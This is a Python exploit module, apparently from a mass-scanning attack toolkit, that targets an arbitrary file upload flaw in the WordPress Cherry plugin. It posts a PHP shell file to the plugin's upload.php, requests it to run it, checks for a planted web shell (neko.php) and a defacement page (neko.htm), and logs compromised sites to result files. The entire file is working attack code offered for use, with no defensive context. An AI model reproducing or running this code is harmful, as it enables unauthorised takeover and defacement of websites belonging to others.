
import requests, re
from Exploits import printModule
pagelinesExploitShell = 'files/settings_auto.php'
Headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}


def Exploit(site):
    try:
        ShellFile = {'file': (pagelinesExploitShell, open(pagelinesExploitShell, 'rb')
                              , 'multipart/form-data')}
        Exp = 'http://' + site + '/wp-content/plugins/cherry-plugin/admin/import-export/upload.php'
        requests.post(Exp, files=ShellFile, timeout=10, headers=Headers)
        Shell = 'http://' + site + '/wp-content/plugins/cherry-plugin/admin/import-export/' \
                + pagelinesExploitShell.split('/')[1]
        GoT = requests.get(Shell, timeout=10, headers=Headers)
        if GoT.status_code == 200:
            CheckShell = requests.get('http://' + site + '/wp-content/neko.php', timeout=10, headers=Headers)
            CheckIndex = requests.get('http://' + site + '/neko.htm', timeout=10, headers=Headers)
            if 'Vuln!!' in str(CheckShell.content):
                with open('Result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/wp-content/neko.php' + '\n')
                if 'Vuln!!' in str(CheckIndex.content):
                    with open('Result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/neko.htm' + '\n')
                return printModule.returnYes(site, 'N/A', 'Wordpress Cherry-plugin', 'Wordpress')
            else:
                return printModule.returnNo(site, 'N/A', 'Wordpress Cherry-plugin', 'Wordpress')
        else:
            return printModule.returnNo(site, 'N/A', 'Wordpress Cherry-plugin', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'Wordpress Cherry-plugin', 'Wordpress')
